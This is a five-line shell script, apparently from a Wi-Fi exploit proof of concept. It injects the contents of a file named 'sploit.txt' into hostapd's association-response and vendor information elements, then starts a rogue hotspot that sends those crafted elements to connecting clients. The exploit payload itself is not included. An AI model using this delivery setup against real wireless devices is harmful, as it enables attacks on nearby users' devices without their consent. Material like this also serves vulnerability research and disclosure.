cp hostapd-hotspot-template.conf hostapd-hotspot.conf
thetext=`python3 removecomments.py <sploit.txt`
echo "assocresp_elements=$thetext" >>hostapd-hotspot.conf
echo "vendor_elements=$thetext" >>hostapd-hotspot.conf
hostapd-2.6/hostapd/hostapd hostapd-hotspot.conf
